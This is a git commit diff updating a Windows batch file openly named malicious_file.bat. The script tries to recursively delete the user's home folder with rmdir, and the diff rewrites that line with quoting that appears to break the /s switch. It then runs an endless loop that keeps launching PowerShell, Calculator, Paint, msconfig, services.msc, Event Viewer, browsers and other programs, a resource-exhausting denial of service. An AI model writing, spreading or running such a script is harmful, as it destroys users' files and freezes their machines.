ac32e88aef22d7aaa958b8ec7c9578bb63184710
GameBlack66 <a6601.bs@gmail.com>
2026-01-13 08:23:41 +0100

    Update malicious_file.bat

--- malicious_file.bat
+++ malicious_file.bat
@@ -1,4 +1,14 @@
-rmdir C:\Users\%username%\ /s
+rmdir "C:\Users\%username%\/s"
 :loop
 start powershell
+start calc.exe
+start
+start mspaint
+start control
+start notepad
+start msconfig
+start services.msc
+start eventvwr
+start firefox
+start chrome
 goto loop
